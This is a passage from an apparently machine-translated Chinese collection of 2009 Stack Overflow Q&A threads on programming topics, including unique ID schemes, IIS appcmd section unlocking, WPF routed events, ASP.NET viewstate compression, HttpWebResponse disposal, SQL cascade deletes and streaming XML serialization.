*   是否可以使用非整数（我目前使用 bigints）作为标识列，以便我可以在 ID 前面加上代表对象类型的东西？（例如 varchar 列）

*   使用仅包含标识列和对象类型的“主表”是否是个好主意，这样我可以在需要新想法时在其中插入一行。我觉得这可能有点矫枉过正，而且我担心它会使我所有的插入请求变得复杂。另外，如果不查看数据库，我将无法确定对象类型

*   还有其他聪明的方法来解决我的问题吗？

* * *

## 回答 #1

> 赞同：56
> 
> 时间：2009-04-06T13:50:10.977

为什么不在所有表上都使用身份，而在任何时候将其呈现给用户时，只需为该类型添加一个字符？例如，O1234 是订单，D123213 是交货，等等？这样你就不必设计一些疯狂的计划......

* * *

## 回答 #2

> 赞同：13
> 
> 时间：2009-04-06T13:53:55.007

在用户界面处理——在向用户报告时在 ID 号上添加一个（或多个）前缀字母。所以 o472 是订单，b531 是账单，以此类推。在通过电话输入“数字”时，人们很容易混合字母和数字，并且比直接数字更准确。

* * *

## 回答 #3

> 赞同：12
> 
> 时间：2009-04-06T13:51:28.150

您可以使用自动增量列来生成唯一 ID。然后有一个计算列，该列采用该列的值并在其前面加上一个反映实体类型的固定标识符，例如 OR1542 和 DL1542，分别表示订单 #1542 和交付 #1542。您的前缀可以根据需要进行扩展，并且可以安排格式以帮助区分具有相同自动增量值的项目，例如 OR011542 和 DL021542，前缀为 OR01 和 DL02。

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2009-04-06T13:44:59.833

我将通过定义一个通用根表来实现。因为没有更好的名字，所以叫它实体。Entity 表上至少应该有一个 Identity 列。您还可以包括所有对象中常见的其他字段，甚至包括告诉您此行是订单的元数据。

您的每个实际 Order、Delivery... 表都会有一个指向 Entity 表的 FK 引用。这将为您提供一个唯一的 ID 列

在我看来，使用种子是一个坏主意，而且可能会导致问题。

# 编辑

你已经提到的一些问题。我还认为跟踪并确保您正确设置所有新实体是一件很痛苦的事情。想象一个开发人员在两年后更新系统。

在我写完这个答案之后，我想到了更多关于你为什么这样做的想法，我得出了与马特相同的结论。

* * *

## 回答 #5

> 赞同：3
> 
> 时间：2009-04-16T02:44:03.977

MS 的有意编程项目有一个 GUID-to-word 系统，可以从随机 ID 中给出可发音的名称

* * *

## 回答 #6

> 赞同：3
> 
> 时间：2009-05-01T20:57:31.947

为什么不是 bigint 的简单 Base36 表示？ [http://en.wikipedia.org/wiki/Base_36](http://en.wikipedia.org/wiki/Base_36)

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2009-04-16T18:15:20.307

我们在一个项目中遇到了类似的问题。我们通过首先创建一个只有一行的简单表来解决它：将 BIGINT 设置为自动增量标识。我们创建了一个存储过程，它在该表中插入一个新行，使用默认值并在事务内部。然后它将 存储`SCOPE_IDENTITY`在一个变量中，回滚事务，然后返回存储的`SCOPE_IDENTITY`。

这为我们提供了数据库内的唯一 ID，而无需填写表格。

如果您想知道 ID 指的是哪种对象，我会丢失事务回滚并将对象类型存储在 ID 旁边。这样就可以找出 Id 所指的对象类型只有一个选择（或内部连接）。

* * *

## 回答 #8

> 赞同：1
> 
> 时间：2009-04-17T00:14:27.073

我为此使用了高/低算法。我在网上找不到这个的描述。必须写博客。

在我的数据库中，我有一个带有计数器字段的 ID 表。这是高的部分。在我的应用程序中，我有一个从 0 到 99 的计数器。这是较低的部分。生成的密钥为 100 * high + low。

要获得密钥，我执行以下操作

```
initially high = -1
initially low = 0

method GetNewKey()
begin
  if high = -1 then
    high = GetNewHighFromDatabase

  newkey = 100 * high + low.
  Inc low
  If low = 100 then
    low = 0
    high = -1

  return newKey
end 
```

真正的代码使用锁等更复杂，但这是一般要点。

有很多方法可以从数据库中获取高价值，包括自动 inc 键、生成器等。最好的方法取决于您使用的数据库。

该算法提供了简单的密钥，同时避免了每次查找新密钥的大部分数据库命中。在测试中，我发现它与 guid 具有相似的性能，并且比每次都检索 auto inc 密钥的性能要好得多。

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2009-04-06T13:46:25.900

`UniqueObject`您可以使用您的身份和子类型字段创建一个主表。子表（订单、用户等）将具有 UniqueObject 的 FK。`INSTEAD OF INSERT`触发器应将疼痛降至最低。

* * *

## 回答 #10

> 赞同：0
> 
> 时间：2009-04-16T09:51:24.700

也许是 itemType-year-week-orderNumberThisWeek 变体？

```
o2009-22-93402 
```

这样的标识符可以由几个数据库列值组成，并由软件简单地格式化为标识符的形式。

* * *

## 回答 #11

> 赞同：0
> 
> 时间：2009-06-16T20:10:04.227

我在一个项目中遇到了类似的情况。

我的解决方案：默认情况下，*用户*只能看到 GUID 的前 7 个字符。

它是足够随机的，碰撞极不可能发生（2.68 亿分之一），而且它对于说话和打字都很有效。

当然，在内部，我使用的是整个 GUID。

# iis - 如何在 IIS 7 中使用 appcmd 更改 allowDefinition 部分属性？

> ID：721505
> 
> 赞同：14
> 
> 时间：2009-04-06T13:45:17.523
> 
> 标签：iis, iis-7, appcmd

是否可以使用 appcmd 更改 allowDefinition 的值？具体来说，我尝试在应用程序级别启用对 httpCompression 模块的更改。

通过手动更改以下行来修改 applicationHost.config：

```
<section name="httpCompression" allowDefinition="AppHostOnly" overrideModeDefault="Deny" /> 
```

至

```
<section name="httpCompression" allowDefinition="MachineToApplication" overrideModeDefault="Allow" /> 
```

然后允许我执行以下 appcmd 命令：

```
appcmd set config "website name" /section:httpCompression /noCompressionForProxies:false
appcmd set config "website name" /section:httpCompression /noCompressionForHttp10:false 
```

但是我需要一个不依赖于手动编辑 applicationHost.config 的解决方案

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2010-11-15T14:42:10.410

我的问题是，我必须将 anonymousAuthentication 从 False 更改为 True。当我这样做时： **appcmd set config websitename /section:anonymousAuthentication /enabled:True**

我得到的错误：配置错误此配置不能用于此路径。当该部分在父级锁定时会发生这种情况。锁定是默认情况下（overrideModeDefault="Deny"）...

要解锁，请执行以下操作： **appcmd unlock config /section:?** 这将列出您想要的部分。然后输入：

**appcmd 解锁配置 /section:system.webserver/security/authentication/anonymousauthentication**

而已... ：）

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-07-01T15:13:50.397

尝试使用`%windir%\system32\inetsrv\appcmd unlock config -section:*sectionName*`. 请参阅[http://blog.donnfelker.com/2007/03/26/iis-7-this-configuration-section-cannot-be-used-at-this-path/](http://blog.donnfelker.com/2007/03/26/iis-7-this-configuration-section-cannot-be-used-at-this-path/)

在发布此答案后，我实际上遇到了这样做的需要。

```
%systemroot%\System32\inetsrv\appcmd.exe unlock config /section:system.WebServer/[rest of the path to config section you need to edit] 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2010-05-24T04:15:50.617

一个大警告，你不应该改变allowDefinition，这是一个重要的设置，通常是有原因的，例如，即使你将它设置在特定的目录或应用程序中它也可能不起作用，所以开发人员有指定。

所以请不要修改节定义中的 allowDefinition 属性。另一方面，您可以修改 overrideModeDefault 这将允许用户在定义允许的情况下在不同的位置定义它。

# wpf - WPF 事件和对对象的引用，以及如何管理它们

> ID：721506
> 
> 赞同：0
> 
> 时间：2009-04-06T13:45:26.823
> 
> 标签：wpf, events

我有一个小型 WPF 应用程序，它有一个画布和一个网格。我在 Grid 上放置了一些自定义用户控件。现在我想在它们上面捕捉一些鼠标事件。作为一个事件的结果，我想在画布上添加（或修改）一些东西。但是在用户控件中，您没有对基础画布的引用。第一个问题，有没有办法获得这个参考，例如 JavaScript 中的 getElementById(..)。

我也知道如果你想要一个干净的架构，你应该避免这样的引用。在这种情况下，在特定用户控件上捕获事件然后能够在另一个对象上调用某些东西是一个好习惯。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-04-06T14:05:37.180

您确实可以访问用户控件中的 Canvas、Grid 或任何其他元素。访问它们的最简单方法是确保每个人都有一个名称，该名称是通过使用 x:Name 属性完成的。

```
<Grid x:Name="myGrid"> 
```

然后在您的 UserControl 中，您可以使用 myGrid 访问它。要从 UserControl 外部访问 Grid，您需要在 UserControl 中创建一个允许您操作它的方法。

您可以在 UserControl 中使用 this.FindName 方法，该方法与 javascript 的 getElementById 等效，但您不需要使用它，因为您可以使用对象的名称直接访问对象。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-04-06T14:33:00.453

WPF 有一个新的事件架构，可以帮助你。所谓的“路由”事件可以从逻辑根容器通过所有中间容器“隧道”到事件源元素，或者从源元素向上“冒泡”（即“隧道”和“冒泡”事件传播相反方向）。

也就是说，您通常可以通过在容器中注册事件处理程序来拦截来自子元素的事件。下面是从 StackPanel 中的按钮拦截按钮单击事件的示例：

```
<StackPanel ButtonBase.Click="HandleButtonClick">
    <Button>Foo</Button>
    <Button>Bar</Button>
</StackPanel> 
```

并且`HandleButtonClick`可能像这样实现：

```
private void HandleButtonClick(object sender, RoutedEventArgs e)
{
    var button = e.OriginalSource as Button;
    if (button != null) MessageBox.Show(button.Content.ToString());
} 
```

根据您使用的“自定义控件”类型，这可能是不可能的。这是因为并非所有事件都是“路由”事件。WPF 控件事件*通常是*路由事件。

# java - 如何检查 Java 字符是否为货币符号

> ID：721509
> 
> 赞同：5
> 
> 时间：2009-04-06T13:46:25.290
> 
> 标签：java, unicode, validation, currency, character

我必须对字符变量进行检查以查看它是否是货币符号。我发现了这个`Character.UnicodeBlock.CURRENCY_SYMBOLS`常量，但是我不确定如何使用它来确定字符是否在该块中。

如果有人在帮助之前这样做过，将不胜感激。

谢谢

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2009-04-06T13:49:05.457

是的，[根据 Java API](http://java.sun.com/javase/6/docs/api/java/lang/Character.UnicodeBlock.html#CURRENCY_SYMBOLS) - 这就是您正在寻找的常量。

要获取 char 类型，请使用[`Character.getType(c)`](http://java.sun.com/javase/6/docs/api/java/lang/Character.html#getType(char))静态方法，如下所示：

```
char c = '$';
System.out.println(Character.getType(c) == Character.CURRENCY_SYMBOL);
// prints true 
```

# asp.net - Viewstate 压缩问题

> ID：721518
> 
> 赞同：5
> 
> 时间：2009-04-06T13:47:52.277
> 
> 标签：asp.net, compression, viewstate

我目前正在与 .NET Viewstate 作斗争，它开始让我感到厌烦。发现我们的一个应用程序中的一些页面由大约 80% 的视图状态组成，我已经考虑尽可能减少这一点。

我已经看过（并且很满意）为不需要它的控件（标签、按钮等）禁用视图状态，并在这里取得了一些小收获。

我现在正在研究视图状态压缩，虽然我可以证明大小减少了 40-50%，但它似乎不适用于我的应用程序。

场景：页面包含几个下拉列表、一个按钮和一个 Grdiview（因此需要处理 ViewState！）。当页面加载时，会填充 DDL 并进行默认选择。按 OK 按钮会按预期填充 Gridview。

现在的问题：启用 Viewstate Compression 后，如果用户在单击“确定”按钮之前更改 DDL 中的选定项目，他们将收到“必填字段验证器”错误，表明尚未在其中一个 DDL 中进行选择 - 但这不是这样的！禁用压缩代码可以消除问题，并且页面按预期运行（即几个月以来一直如此！）。

问题是否可以归结为现在存储在 __VIEWSTATE 以外的键中的视图状态（我看到的代码使用不同的键名 - 例如 VSTATE）。

我的页面来源如下所示；

带有压缩的页面源（注意空的 __VIEWSTATE 键）：

```
<div>
<input type="hidden" name="__EVENTTARGET" id="__EVENTTARGET" value="" />
<input type="hidden" name="__EVENTARGUMENT" id="__EVENTARGUMENT" value="" />
<input type="hidden" name="__LASTFOCUS" id="__LASTFOCUS" value="" />
<input type="hidden" name="__VSTATE" id="__VSTATE" value="H4sIAAAAAEAO29B2AcSZYlJ
.
.
MKd2afqdaImFR5UiFXVyQPwLPA//8xt+pMsSQ8vlOklcoNgmZfJd8hHvk6/S/7UbxxAJTjzZfp6Qcm039
h3d3dvvPO7/Oa/7i57uemj1H2a/gw5lJQ+ySjFRtPZUL7A/3o2ImFR5UiFXVyLPA+38At70F1EkwAAA=" />
<input type="hidden" name="__VIEWSTATE" id="
__VIEWSTATE" value="" />
</div> 
```

没有压缩的页面源：

```
<div>
<input type="hidden" name="__EVENTTARGET" id="__EVENTTARGET" value="" />
<input type="hidden" name="__EVENTARGUMENT" id="__EVENTARGUMENT" value="" />
<input type="hidden" name="__LASTFOCUS" id="__LASTFOCUS" value="" />
<input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE" value="/wEPDwUKMTYxOTM1NDg4N
A9kFgJmD2QWAgIDD2QWAgIFD2QWAmYPZBYKAgEPZBYIAgcPZBYCAgMPDxYCHgRUZXh0BRdEYXduQyBbY2hhbm
dlIHBhc3N3b3JkXWRkAgkPFgIeB1Zpc2libGVoFgQCAQ8PFgIfAAUFQWRtaW5kZAIDDw8WAh8ABQUxNDoyNGR
.
.
.
.
.
.
kAgsPDxYEHwAFWVNlbGVjdGVkIFNlcnZpY2UgVXNlcjogPGEgY2xhc3M9J3N1U2VsZWN0b3InIGhyZWY9J2xp
c3RzZXJ2aWNldXNlcnMuYXNweCc+PGI+bm9uZTwvYj48L2E+HwFoZGQCDw8QZGQWAGQCBQ8UKwADZDwrABQEA
BYSHg9QYXJlbnRJdGVtQ2xhc3MFC2lnbW5fUGFyZW50HhdUb3BMZXZlbFBhcmVudEl0ZW1DbGFzcwUTaWdtbl
Ub3BFBhcmVudB4KSlNGaWxlTmFtZWUeFlRvcExldmVsSG92ZXJJdGVtQ2xhc3MFNGlnbW5fVG9wTGV"     
/>
</div> 
```

.NET 如何知道 VIEWSTATE 的存储位置以及它是否知道我已经移动了它？

除了实现 SavePageStateToPersistenceMedium 和 LoadPageStateFromPersistenceMedium 之外，我是否需要对我的代码进行任何其他更改？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2009-04-06T13:58:14.590

嘿，视图状态压缩对我有用，没有任何问题。基本上，我的所有使用视图状态的 aspx 页面都有一个基类。即使我使用不同的视图状态键来保存我的视图状态。但是，您必须为此覆盖 2 个方法：

1) - 保存视图状态 2) - 加载视图状态

只要你这样做，你应该没有问题。请参阅下面我用于我的基类的代码

```
using System;
using System.IO;
using System.Web.UI;

namespace XC.UI.WebForms
{

    public class PageBase : System.Web.UI.Page
    {

        protected override object LoadPageStateFromPersistenceMedium()
        {
            string viewState = Request.Form["__VSTATE"];
            byte[] bytes = Convert.FromBase64String(viewState);
            bytes = XC.Common.ViewStateHelper.Decompress(bytes);
            LosFormatter formatter = new LosFormatter();
            return formatter.Deserialize(Convert.ToBase64String(bytes));
        }

        protected override void SavePageStateToPersistenceMedium(object viewState)
        {
            LosFormatter formatter = new LosFormatter();
            StringWriter writer = new StringWriter();
            formatter.Serialize(writer, viewState);
            string viewStateString = writer.ToString();
            byte[] bytes = Convert.FromBase64String(viewStateString);
            bytes = XC.Common.ViewStateHelper.Compress(bytes);
            ClientScript.RegisterHiddenField("__VSTATE", Convert.ToBase64String(bytes));
        }

    }

} 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2010-09-21T06:55:24.157

如果您在页面中使用 ajax，请更改这行代码。它会解决你的问题。ClientScript.RegisterHiddenField("__VSTATE", Convert.ToBase64String(bytes)); 用 ScriptManager 替换上面的语句。ScriptManager.RegisterHiddenField(this, "__VSTATE", Convert.ToBase64String(bytes));

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2009-04-06T13:55:39.933

.NET 中隐藏了一个常量，用于保存视图状态字段名称。我们通过挂钩您描述的方法进行压缩，但保持视图状态名称相同而不会出现问题。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2009-04-06T14:07:27.893

这可能有点矫枉过正，但在 www.strangeloop.net 上有一个非常酷的硬件解决方案来解决这个问题。没有从属关系，只是对技术印象深刻。

回到页面 tho - 什么样的控件正在生成所有这些视图状态？网格？您表示您已经对此进行了处理，但请注意设置了 runat="server" 的表、td、tr、div 等的“不必要的 runats”。这些控件的全部内容都保存在视图状态中。我们最近通过识别 div 是客户端并且不需要 runat="server" 将我们的 viewstate 有效负载削减了 40%。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2011-11-22T06:14:21.160

压缩对我不起作用，因为它只是降低了 40%。我有 200-300KB 的 ViewStates，并且大大降低了应用程序的性能。

我编写了一些视图状态替换技术，将其替换为页面上的 GUID 令牌，并将服务器本身的实际数据保存在数据库中。

这是代码和技术。

[http://ashishnangla.com/2011/07/21/reducing-size-of-viewstate-in-asp-net-webforms-by-writing-a-custom-viewstate-provider-pagestatepersister-part-12/](http://ashishnangla.com/2011/07/21/reducing-size-of-viewstate-in-asp-net-webforms-by-writing-a-custom-viewstate-provider-pagestatepersister-part-12/)

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2014-07-02T18:03:10.877

以下答案不是我的，而是 OP（包含在问题中）。我将其排除在外，并使其成为社区维基。

* * *

我已经深入了解了 - 几乎，我已经成功了！由于某种原因，使用 ClientScript.RegisterHiddenField 方法似乎是问题的根源。修改代码以利用基类保存方法，即 base.SavePageStateToPersistenceMedium(compressedBytes) 并处理由 base.LoadPageStateFromPersistenceMedium() 返回的 Pair 对象我现在有了一个可行的解决方案。测试显示在测试页面上减少了大约 70%，所以我对此非常满意。

现在我已经进行了压缩工作，我需要建议下一次（第一次正确的）代码审查将重点放在删除不需要的视图状态上。

# javascript - 如何强制 GInfoWindow 缩短它的尾巴？

> ID：721526
> 
> 赞同：2
> 
> 时间：2009-04-06T13:49:32.600
> 
> 标签：javascript, json, google-maps, openinfowindowhtml

在我的谷歌地图应用程序中，它应该主要在 iPhone 上运行，因此窗口分辨率为 480/320，我在 GInfoWindow 信息气泡中显示了一些“东西”。问题是，有时气泡中的内容太多，以至于无法完全按照我想要的方式显示在屏幕上。

这是一个例子

[太大的泡沫 http://www.perhac.com/Capture.PNG](http://www.perhac.com/Capture.PNG)

这并不完全是一场灾难，但在这种情况下，标记被稍微推离屏幕，并且气泡的顶部也没有完全显示。但后来我注意到气泡的“尾巴”（将信息窗口连接到标记）太长了。

有谁知道缩短它的简单方法？是否有一些财产`GInfoWindowOptions`可以帮助我解决这个问题？我不知道`pixelOffset`要走的路...

**编辑**

* * *

这会使问题变得非常长，但我想让你注意到，在从谷歌下载的图像中，有*一条*短尾巴，还有它的短阴影……这就是为什么我仍然相信一定有一种使用它的方法一...

![气泡图像](https://maps.google.com/intl/en_ALL/mapfiles/iw3.png)

![阴影](https://maps.google.com/intl/en_ALL/mapfiles/iws3.png)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-04-14T04:04:51.397

目前[没有缩短 infoWindow tail 的选项](http://code.google.com/apis/maps/documentation/reference.html#GInfoWindowOptions)。

你是对的，pixelOffset 不是你想要的。它相当于设置 infoWindowAnchor 偏移量，从而产生相同长度的尾部，但指向图标的点偏移量（可能是屏幕下方）。因此，您可以使用这种方法移动窗口（只要您使用 map.openInfoWindowHtml，marker.openInfoWindowHtml 不支持），但指向图标下方某物的尾部看起来相当平均。

我希望我在这里遗漏了一些东西，有人可以纠正我。

或者，如果实现此功能会很棒。我觉得 pixelOffset 应该这样做，因为您在创建图标时已经可以偏移 infoWindowAnchor。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-07-07T21:27:07.957

该图像中的短尾用于[最大化](http://code.google.com/apis/maps/documentation/reference.html#GInfoWindow.enableMaximize)信息窗口。没有任何方法可以将它用于常规 infoWindow。

一个不错的选择是使用第三方 infoWindow。有关几个选项的列表，请参阅[此帖子](https://stackoverflow.com/questions/262504/google-maps-bubble-templates/1080229#1080229)。

# c# - 使用 HttpWebResponse 时如何最好地处理异常

> ID：721534
> 
> 赞同：3
> 
> 时间：2009-04-06T13:51:30.350
> 
> 标签：c#, exception-handling

我正在寻找有关如何处理以下代码示例中抛出的任何异常的建议：

```
private string SendRequest()
{
        HttpWebRequest request = (HttpWebRequest)WebRequest.Create(myURL);
        // Code initialising HttpWebRequest
        HttpWebResponse response = (HttpWebResponse)request.GetResponse();
        Stream rcvdStream = response.GetResponseStream();
        StreamReader readStream = new StreamReader(rcvdStream, Encoding.UTF8);
        string responseString = readStream.ReadToEnd();
        response.Close();
        readStream.Close();
        return responseString;
} 
```

我主要关心的是确保 StreamReader 和 HttpRequest 对象在方法结束时关闭。我是不是该：

1.  在 try/catch/finally 中将所有内容包装起来，在 catch 块中记录任何异常并在 finally 块中关闭流？
2.  在创建 StreamReader 时对 HttpWebRequest 对象实例化使用 using 语句和嵌套 using 语句？
3.  不用担心它并假设当方法退出时对象超出范围时GC会清除所有内容？

**编辑**：进一步调查显示，选项 2 可以在不嵌套 using 语句的情况下完成：

```
 using (HttpWebResponse response = (HttpWebResponse)request.GetResponse())
    using (Stream rcvdStream = response.GetResponseStream())
    {
        StreamReader readStream = new StreamReader(rcvdStream, Encoding.UTF8);
        payResponse = readStream.ReadToEnd();
    } 
```

这将产生以下 IL 代码，证明它正在有效地创建一个嵌套的 try/finally 块：

```
 IL_00b0:  callvirt   instance class [System]System.Net.WebResponse [System]System.Net.WebRequest::GetResponse()
  IL_00b5:  castclass  [System]System.Net.HttpWebResponse
  IL_00ba:  stloc.s    response
  .try
  {
    IL_00bc:  ldloc.s    response
    IL_00be:  callvirt   instance class [mscorlib]System.IO.Stream [System]System.Net.WebResponse::GetResponseStream()
    IL_00c3:  stloc.s    rcvdStream
    .try
    {
      IL_00c5:  nop
      IL_00c6:  ldloc.s    rcvdStream
      IL_00c8:  call       class [mscorlib]System.Text.Encoding [mscorlib]System.Text.Encoding::get_UTF8()
      IL_00cd:  newobj     instance void [mscorlib]System.IO.StreamReader::.ctor(class [mscorlib]System.IO.Stream,
                                                                                 class [mscorlib]System.Text.Encoding)
      IL_00d2:  stloc.s    readStream
      IL_00d4:  ldloc.s    readStream
      IL_00d6:  callvirt   instance string [mscorlib]System.IO.TextReader::ReadToEnd()
      IL_00db:  stloc.3
      IL_00dc:  nop
      IL_00dd:  leave.s    IL_00f3
    }  // end .try
    finally
    {
      IL_00df:  ldloc.s    rcvdStream
      IL_00e1:  ldnull
      IL_00e2:  ceq
      IL_00e4:  stloc.s    CS$4$0001
      IL_00e6:  ldloc.s    CS$4$0001
      IL_00e8:  brtrue.s   IL_00f2
      IL_00ea:  ldloc.s    rcvdStream
      IL_00ec:  callvirt   instance void [mscorlib]System.IDisposable::Dispose()
      IL_00f1:  nop
      IL_00f2:  endfinally
    }  // end handler
    IL_00f3:  nop
    IL_00f4:  leave.s    IL_010a
  }  // end .try
  finally
  {
    IL_00f6:  ldloc.s    response
    IL_00f8:  ldnull
    IL_00f9:  ceq
    IL_00fb:  stloc.s    CS$4$0001
    IL_00fd:  ldloc.s    CS$4$0001
    IL_00ff:  brtrue.s   IL_0109
    IL_0101:  ldloc.s    response
    IL_0103:  callvirt   instance void [mscorlib]System.IDisposable::Dispose()
    IL_0108:  nop
    IL_0109:  endfinally
  }  // end handler 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-04-06T14:41:29.840

选项一和二是您最好的选择。选项 3 不是一个好主意。

我个人非常喜欢 Using 语句路线。但是，try/catch/finally 路由本质上是相同的，并为您提供所需的日志记录机制。

# asp.net - 是否可以使用 sql 数据源从 2 个或更多 sql 表中删除？

> ID：721536
> 
> 赞同：1
> 
> 时间：2009-04-06T13:51:33.967
> 
> 标签：asp.net, sql

当我从我的数据网格中删除一行时，我收到一个 FK 错误，因为我看不到从 FK 是主表的其他表中删除的方法？

我收到此错误：

DELETE 语句与 REFERENCE 约束“FK_Availability_Fixture”冲突。冲突发生在数据库“Rugby”、表“dbo.Availability”、列“FixtureId”中。该语句已终止。说明：执行当前 Web 请求期间发生未处理的异常。请查看堆栈跟踪以获取有关错误及其源自代码的位置的更多信息。

异常详细信息：System.Data.SqlClient.SqlException：DELETE 语句与 REFERENCE 约束“FK_Availability_Fixture”冲突。冲突发生在数据库“Rugby”、表“dbo.Availability”、列“FixtureId”中。该语句已终止。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2009-04-06T13:55:53.317

您可以将 FK 关系定义为删除时级联。这将导致删除语句级联（删除）所有子表。

从[MSDN 签出页面](http://msdn.microsoft.com/en-us/library/aa933119(SQL.80).aspx)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-04-06T13:56:14.080

您的数据库说：“不允许`Availability.FixtureID`列引用不存在的值。” `Availability`因此，当表中的行引用它时，从 Fixture 表中删除一行将违反此规则。

因此，您有两个选择，任何一个都同样有效，但第一个可能是您正在寻找的：

1.  找到名为 的外键关系`FK_Availability_Fixture`，然后对该`FixtureId`列启用级联删除。
2.  手动删除表中的依赖行`Availability`，或更新有`FixtureID`问题的特定行的依赖行，以便它引用不同的`FixtureID`值。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-04-06T13:58:48.100

这是维护数据完整性的“应该发生的”：另一个表中的一行引用了您要删除的行。

如果您的删除成功，则其他表的引用将毫无意义。

解决此问题的唯一方法是首先删除引用行（这可能意味着删除也引用您尝试删除的行的其他行。）

这表明：a）您不应该删除这一行，b）或者您需要先删除其他（可能还有许多其他）行，或者 c）您的表格设计不适合使用你试图使数据库。

# c# - .net 中的流式 XML 序列化

> ID：721537
> 
> 赞同：3
> 
> 时间：2009-04-06T13:51:41.800
> 
> 标签：c#, .net, xml, serialization, streaming

我正在尝试使用 a 序列化一个非常大`IEnumerable<MyObject>`的`XmlSerializer`对象，而不将所有对象都保存在内存中。

`IEnumerable<MyObject>`其实很懒。。

我正在寻找一种流媒体解决方案，它将：

1.  使用标准序列化将对象从`IEnumerable<MyObject>` 序列化到底层流（*我不想在这里手工制作 XML！*）
2.  丢弃内存中的数据并移动到下一个

我正在尝试使用此代码：

```
using (var writer = new StreamWriter(filePath))
{
 var xmlSerializer = new XmlSerializer(typeof(MyObject));
  foreach (var myObject in myObjectsIEnumerable)
  {
   xmlSerializer.Serialize(writer, myObject);
  }
} 
```

但我得到了多个 XML 标头，我无法指定根标记`<MyObjects>`，因此我的 XML 无效。

任何的想法？

谢谢

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2009-05-13T19:15:12.380

该类`XmlWriter`是用于 XML 生成的快速流 API。这是相当低级的，MSDN 有[一篇](https://msdn.microsoft.com/en-us/library/system.xml.xmlwriter(v=vs.110).aspx)关于使用`XmlWriter.Create()`.

编辑：链接已修复。以下是文章中的示例代码：

```
async Task TestWriter(Stream stream) 
{
    XmlWriterSettings settings = new XmlWriterSettings();
    settings.Async = true;

    using (XmlWriter writer = XmlWriter.Create(stream, settings)) {
        await writer.WriteStartElementAsync("pf", "root", "http://ns");
        await writer.WriteStartElementAsync(null, "sub", null);
        await writer.WriteAttributeStringAsync(null, "att", null, "val");
        await writer.WriteStringAsync("text");
        await writer.WriteEndElementAsync();
        await writer.WriteCommentAsync("cValue");
        await writer.WriteCDataAsync("cdata value");
        await writer.WriteEndElementAsync();
        await writer.FlushAsync();
    }
} 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2009-04-06T14:04:08.367

这是我使用的：

```
using System;
using System.Collections.Generic;
using System.Xml;
using System.Xml.Serialization;
using System.Text;
using System.IO;

namespace Utils
{
    public class XMLSerializer
    {
        public static Byte[] StringToUTF8ByteArray(String xmlString)
        {
            return new UTF8Encoding().GetBytes(xmlString);
        }

        public static String SerializeToXML<T>(T objectToSerialize)
        {
            StringBuilder sb = new StringBuilder();

            XmlWriterSettings settings = 
                new XmlWriterSettings {Encoding = Encoding.UTF8, Indent = true};

            using (XmlWriter xmlWriter = XmlWriter.Create(sb, settings))
            {
                if (xmlWriter != null)
                {
                    new XmlSerializer(typeof(T)).Serialize(xmlWriter, objectToSerialize);
                }
            }

            return sb.ToString();
        }

        public static void DeserializeFromXML<T>(string xmlString, out T deserializedObject) where T : class
        {
            XmlSerializer xs = new XmlSerializer(typeof (T));

            using (MemoryStream memoryStream = new MemoryStream(StringToUTF8ByteArray(xmlString)))
            {
                deserializedObject = xs.Deserialize(memoryStream) as T;
            }
        }
    }
} 
```

然后只需调用：

```
string xml = Utils.SerializeToXML(myObjectsIEnumerable); 
```

例如，我没有尝试过`IEnumerable`一次远程获取一个对象的 an 或任何其他奇怪的用例，但它非常适用`List<T>`于内存中的其他集合。

**编辑**：根据您对此的评论，您可以使用`XmlDocument.LoadXml`将生成的 XML 字符串加载到 中`XmlDocument`，将第一个字符串保存到文件中，并将其用作您的主 XML 文件。对于 中的每个项目`IEnumerable`，`LoadXml`再次使用创建一个新的 in-memory `XmlDocument`，获取所需的节点，将它们附加到主文档，然后再次保存，摆脱新的。

完成后，可能有一种方法可以将所有节点包装在根标记中。您还可以使用 XSL 并`XslCompiledTransform`编写另一个 XML 文件，并将对象正确包装在根标记中。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-04-07T00:52:02.727

您可以通过`IXmlSerializable`在大类上实现接口来做到这一点。该`WriteXml`方法的实现可以编写开始标记，然后简单地循环`IEnumerable<MyObject>`并将每个序列化为`MyObject`相同的`XmlWriter`，一次一个。

在这个实现中，不会*有*任何内存中的数据需要删除（除了垃圾收集器将收集的数据）。

# tfs - 为什么我的本地路径映射是我的团队资源管理器源代码控制窗口中的链接，而不是我的同事

> ID：721544
> 
> 赞同：-1
> 
> 时间：2009-04-06T13:54:06.957
> 
> 标签：tfs

显然，与我的同事相比，我的团队资源管理器的设置有所不同。在我的源代码浏览器中，本地路径标签是一个超链接，可在该位置打开资源管理器窗口（非常方便！）但我的同桌并非如此......我想知道我与他们有什么不同？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-04-06T14:47:11.620

您的机器上安装了 VS2008 SP1，而您的同事没有。

# open-source - 开源项目是如何管理的

> ID：721545
> 
> 赞同：6
> 
> 时间：2009-04-06T13:54:39.343
> 
> 标签：open-source, project-management, collaboration

我在业余时间在一个小团队中从事一些项目。我们遇到了一个问题，我们似乎在兜圈子，无法开发我们的产品——但这在我的日常工作中不是问题。缺乏面对面的交流似乎对生产力产生了真正的影响。

开源开发社区使用的软件或方法的任何示例都将受到赞赏。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2009-04-06T15:05:10.670

